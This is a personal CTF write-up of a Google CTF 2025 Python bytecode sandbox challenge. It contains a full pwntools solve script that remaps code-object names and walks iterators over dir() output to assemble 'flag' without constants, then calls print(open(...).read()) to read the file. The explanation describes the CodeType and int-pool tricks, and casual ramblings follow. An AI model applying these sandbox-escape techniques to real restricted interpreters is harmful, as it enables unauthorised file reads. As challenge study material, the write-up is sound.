



# Intro

As the first blood solver of this challenge when playing googlectf 2025 with r3kapig(😎), my ego feels very inclined to make a writeup about this challenge even though it really isn't that hard of a challenge compared to the other ones, so here I am



# TL;DR

## My solvescript:
```py
from pwn import *




builtins = ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BaseExceptionGroup', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception', 'ExceptionGroup', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'PythonFinalizationError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '_IncompleteInputError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
    

p = process(["/bin/python", "bad.py"])
#p = process(["/bin/sh", "-c", "cat > payload"])

        # ('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'), #names
        # ('a',), #varnames

dir_ = ['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']


str_dir = ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'removeprefix', 'removesuffix', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']


def val(v):
    if v == 0:
        return "(None != None)"

    # if v == 1:
    #     return "(None == None)"
    res = "("
    
    for i in range(v):
        res += "(None == None)+"
    return res[:-1] + ")"




# def dfind(v, sdir = str_dir):
#     res = ""
#     for i, s in enumerate(sdir):
#         if not v in s:
#             continue
        
#         pos = s.find(v)
#         print(v, s, pos)
#         res += f"[{val(i)}][{val(pos)}]"
#         break
#     return res



def _dfind(pos1, pos2):
    #outer
    str_dir = f"dir(dir()[{val(0)}])"
    sl(f"{builtins[0]} = {str_dir}")
    sl(f"{builtins[0]} = {builtins[0]}.__iter__()")
    if pos1 > 0:
        for i in range(pos1):
            sl(f"{builtins[0]}.__next__()")

    sl(f"{builtins[0]} = {builtins[0]}.__next__().__iter__()")

    if pos2 > 0:
        for i in range(pos2):
            sl(f"{builtins[0]}.__next__()")
        sl(f"{builtins[0]} = {builtins[0]}.__next__()")

def dfind(v, sdir = str_dir):
    res = ""
    for i, s in enumerate(sdir):
        if not v in s:
            continue
        
        pos = s.find(v)
        print(v, s, pos)
        return _dfind(i, pos)
    raise Exception()
    


def sl(s : str):
    p.sendline(s.encode())

#('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'), #names
p.sendline((builtins[0] + " = None").encode())
p.sendline(("dir").encode())
p.sendline(("dir().__iter__").encode())
p.sendline((builtins[2] + " = None").encode())
p.sendline(("dir().__iter__().__next__").encode())
p.sendline(b"print")
p.sendline(b"open")

p.sendline(b"read"+ b" = None")
#p.sendline(b"print(None == None)")

str_dir = f"dir(dir()[{val(0)}])"

dfind("f")

sl(f"{builtins[2]} = {builtins[0]}")
dfind("l")

sl(f"{builtins[2]} += {builtins[0]}")
dfind("a")

sl(f"{builtins[2]} += {builtins[0]}")
dfind("g")

sl(f"{builtins[2]} += {builtins[0]}")
# sl(f"print({builtins[2]})")
sl(f"print(open({builtins[2]}).read())")


p.sendline()
p.interactive()


```


## Explanation:


```py
    to_exec = CodeType(
        0,
        0,
        0,
        1,
        10,
        0,
        g.co_code,      #codestring
        (None,),        #constants
        ('p', 'dir', '__iter__', 'f', '__next__', 'print', 'open', 'read'), #names
        ('a',),         #varnames
        '<string>',
        '<module>',
        '',
        1,
        b'',
        b'',
        (),
        (),
    )

    sc = FunctionType (to_exec, {})



```

This snippet makes it so that our "shellcode"(the bytecode our payload compiles to) must conform to the prototype defined above.
Note the "constants" and "names" field. The former limits the constants our code is allowed to use(only None here) and the latter limits the "imports" our code is allowed to use.

This is enforced by the fact that the python bytecode itself doesn't store much info, and its operations are highly dependent on the function type metadata.

To illustrate this more clearly, here's a part of what my solvescript compiles to(viewed using `dis.dis(code))`, before/after the codetype change

before: 


```

  0           RESUME                   0

  1           LOAD_CONST               0 (None)
              STORE_NAME               0 (ArithmeticError)

  2           LOAD_NAME                1 (dir)
              POP_TOP

  3           LOAD_NAME                1 (dir)
              PUSH_NULL
              CALL                     0
              LOAD_ATTR                4 (__iter__)
              POP_TOP

  4           LOAD_CONST               0 (None)
              STORE_NAME               3 (AttributeError)

  5           LOAD_NAME                1 (dir)
              PUSH_NULL
              CALL                     0
              LOAD_ATTR                5 (__iter__ + NULL|self)
              CALL                     0
              LOAD_ATTR                8 (__next__)
              POP_TOP
```



after:

```

          RESUME                   0

          LOAD_CONST               0 (None)
          STORE_NAME               0 (p)

          LOAD_NAME                1 (dir)
          POP_TOP

          LOAD_NAME                1 (dir)
          PUSH_NULL
          CALL                     0
          LOAD_ATTR                4 (__iter__)
          POP_TOP

          LOAD_CONST               0 (None)
          STORE_NAME               3 (f)

          LOAD_NAME                1 (dir)
          PUSH_NULL
          CALL                     0
          LOAD_ATTR                5 (__iter__ + NULL|self)
```
<sub><sup>sorry for the alignment i really cba to fix it</sup></sub>


So, as you can see, the value retrieved is really based on the internal index of the function type, which of course will change accordingly when the function type is changed.

Also, the reason why(debatably) dumb stuff like ArithmeticError is used is due to the fact that the code must also pass the initial compilation on the server, and some of the names in the new type data is invalid in a normal context.



```py
def swap():
    ints = [x for x in range(255)]
    random.shuffle(ints)

    intern_num_size = 28 + 4
    interns = ctypes.string_at(id(1), 255 * intern_num_size)
    structure = lambda x: Intern(x[0:24], u32(x[24:28]), x[28:32])

    new_interns = bytearray()

    for i in range(255):
        st = structure(interns[i* intern_num_size : (i + 1) * intern_num_size])
        st.i = ints[i]
        
        new_interns += st.serialize()
    #  3 2 1 let's jam
    ctypes.memmove(id(1), bytes(new_interns), len(new_interns))
```
This section scrambles the small int object pool that python uses for, well, small integers. 
Instead of creating a new int object every time a new int is needed, python stores some commonly used(i.e. small) ints in here, which is taken out when such a value is needed. 
With the pool scrambled, all small integers except 0(since the scrambling starts from 1), and for all intents and purposes, all ints in general(again, except 0), is now unusable.

To recap, our payload must adhere to the following restrictions:

+ Must be valid python code(lol)
+ Must still be valid under the new CodeType context, which means that*:
    + Only None is allowed as a constant
    + Only the functions in "names" are usable
    + Only one local variable named "a" is allowed**
+ Must not use any integers except 0



<sub>* There may also be other restrictions such as the stack size but I didn't encounter them when solving this
** I'm not entirely sure if this is true, since I had trouble using it and ended up using a var in "names" as my working variable
</sub>

So, with these restrictions in mind, the general idea of my solve is as follows:
+ First, make sure the index of the functions I want to use aligns with the new names index
```py
p.sendline((builtins[0] + " = None").encode())
p.sendline(("dir").encode())
p.sendline(("dir().__iter__").encode())
p.sendline((builtins[2] + " = None").encode())
p.sendline(("dir().__iter__().__next__").encode())
p.sendline(b"print")
p.sendline(b"open")
```
+ Call dir() which returns a list of string objects, and call dir() on the first string(retrieved with dir()[None != None]). This will grant us more than enough strings to construct a "flag" string.
(Note that normal dir() won't return nearly as much as normal due to the "names" code type change)
```py
str_dir = f"dir(dir()[{val(0)}])"
```

+ For each character we want to use, navigate the string dir with iterators, and pull out individual characters with iterators too.
```py
def _dfind(pos1, pos2):
    #outer
    str_dir = f"dir(dir()[{val(0)}])"
    sl(f"{builtins[0]} = {str_dir}")
    sl(f"{builtins[0]} = {builtins[0]}.__iter__()")
    if pos1 > 0:
        for i in range(pos1):
            sl(f"{builtins[0]}.__next__()")

    sl(f"{builtins[0]} = {builtins[0]}.__next__().__iter__()")

    if pos2 > 0:
        for i in range(pos2):
            sl(f"{builtins[0]}.__next__()")
        sl(f"{builtins[0]} = {builtins[0]}.__next__()")
```
+ Save both the iterator and the temporary string in variables provided by "names"
```py
dfind("f")

sl(f"{builtins[2]} = {builtins[0]}")
dfind("l")

sl(f"{builtins[2]} += {builtins[0]}")
dfind("a")

sl(f"{builtins[2]} += {builtins[0]}")
dfind("g")

sl(f"{builtins[2]} += {builtins[0]}")
```

+ Finally, call print(open("flag").read())
```py
sl(f"print(open({builtins[2]}).read())")
```

(Also I think print can be only called once? Might have something to do with the int pool thing idk)



# Credits
riChar and carbofish in r3kapig for giving me info on python internals and giving me inspiration on using iterators for the solve

Other r3kapig members(Eritque arcus, strforexec) for confirming that the "interns" corrupted the int pool



# Ramblings

Anyway that's about it for the solve, there really isn't that much useful info below but if you want to hear a story/have nothing better to do/want to form a parasocial relationship with me(🥺) feel free to scroll down i guess

First off I really wanted to get this out: the joke is that interns will mess shit up, so theres a bunch of "intern" objects that messes up the int pool

kinda sucked that people didnt really seem to get it even when i explained it 😢

if the author of the chal is reading this, i loved the joke and please make more of those next year 



So heres how the actual solve went

I was looking at the zlib pwn challenge(btw i HATE that codebase, dude felt the need to put his name everywhere, everything is messy, and the 1000 line `for(;;)` loop before the switch statement didnt even have 
brackets, i never want to read it again🤮) when this new challenge dropped

I took a look and found it super cool that the challenge was about using python bytecode to do stuff, so i went ahead and took a crack at it 

First thing I noticed was ofc the interns getting memcpyed into memory, I kinda thought that was supposed to be the exploit point but then I noticed that u were able to just upload python code and have it run on the remote so I went with that

also I learned what id() did in this ctf, like I was always vaguely aware that it kinda exists but I didnt know it gave addresses, like wtf thats the coolest shit ever

also also I learned about dis.dis, forget id() THIS is the coolest shit ever, it works for a raw codestring, but its even better with a full function object since it actually like tells you what each index corresponds to

Anyway I figured out the index align thing fairly quickly, but the first roadblock was the no constants thing, but then I thought about how quirky python is and tried to get a 2 by doing (None == None) + (None == None)
I used a python shell to test this so it worked normally, and so I thought I can use this along with dir() to create a string
I even made like a thing where it generates a bunch of (None == None)s to increment it to any desired number and made a auto string search where it would pull characters from dir() with auto generated None == Nones 
But then I tested it and it didnt work and I was like wtf why, and then I realized that the int pool corruption of course affected those too😞

So I was banging my head against the wall on this part for a bit since I was quite stumped on deciding how to do anything from here, and after consulting richar who was sitting next to me, i became aware of the fact that `__iter__` and `__next__` existed in the available functions and well, I could use them to get to any string/char i wanted, and its pretty much smooth sailing from there

and after asking him about how to actually use iter since ive never actually used the "raw" form before, I wrote the new char finder and wrote the solve, quite quickly too apparently since I got a first blood on fuckin **GOOGLE** ctf man how cool is that

Anyway I quite liked this challenge, big reason ofc being to the fact that I got first blood, but also like it was a breath of fresh air from staring at ida, and god forbid, zlib code🤢🤢🤢 for 10000 hours 
I mean sure i also had to look at python bytecode for the first ish part, but after the alignment got figured out its pretty much smooth sailing from there
Also, unlike the other chals where im sort of stumped on something for a fair while before having a breakthrough, I sort of like, perpetually had ideas throughout the process of solving, even the int pool thing didnt stop me for long, so the process was much more enjoyable too
also also i learned like a fair bit about python internals which is quite cool too 
dont really have much else to say here so uhh hope I do better next year I guess






